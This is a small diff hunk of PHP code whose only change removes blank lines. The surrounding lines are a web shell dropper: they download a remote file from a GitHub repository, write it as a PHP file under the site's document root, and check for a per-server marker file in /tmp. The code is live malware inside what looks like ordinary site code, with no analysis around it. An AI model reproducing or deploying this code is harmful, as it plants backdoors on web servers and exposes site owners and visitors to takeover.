@@ -22,9 +22,6 @@ $wpoptionssssr = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/mail.tx
 $wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-linea.php"; 
 if (file_put_contents ($wpoptionsssss, $wpoptionssssr));   die(); }
 
-
-
-
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
 if(file_exists('/tmp/4v4v4gg'.$d.$random)) { } else {
